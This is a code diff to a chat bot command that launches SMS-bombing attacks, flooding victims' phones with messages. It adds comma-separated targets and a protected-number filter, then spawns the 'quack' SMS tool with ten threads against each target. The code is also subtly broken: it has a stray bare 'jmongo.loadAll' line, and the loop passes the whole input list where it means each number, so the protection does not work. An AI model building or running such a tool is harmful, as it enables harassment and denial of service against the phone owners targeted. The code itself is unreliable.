@@ -10,15 +10,23 @@ module.exports = {
             ctx.reply(`The timeout is too big, current limit is: ${process.env.SMS_BOMB_LIMIT}`)
         }
         else{
-            jmongo.load('bannedNumbers', { number: args[0] }, (result) => {
-                if(result===null){
+            jmongo.loadAll
+            jmongo.loadAll('bannedNumbers', (result) => {
+                result = result.map(element => element.number);
+                const numbers_filtered = args[0].split(',').filter(element => !result.includes(element));
+                const protected_numbers = args[0].split(',').filter(element => result.includes(element));
+
+                if(protected_numbers.length > 0) {
+                    ctx.reply(`${protected_numbers.join(', ')} are protected numbers`);
+                }
+                if(numbers_filtered.length > 0) {
+                    ctx.reply(`Started SMS bombing on ${numbers_filtered.join(', ')}`);
+                }
+
+                numbers_filtered.forEach(element => {
                     const ls = spawn("quack", ["--tool", "sms", "--target", args[0], "--timeout", args[1], "--threads", "10"]);
-                    ctx.reply(`Started sms bombing on ${args[0]}`);
                     executeBombing(ls);
-                }
-                else{
-                    ctx.replyWithMarkdown(`\`${args[0]}\` is a protected number, it belongs to *${result.name}*`)
-                }
+                })
             })
         }
 
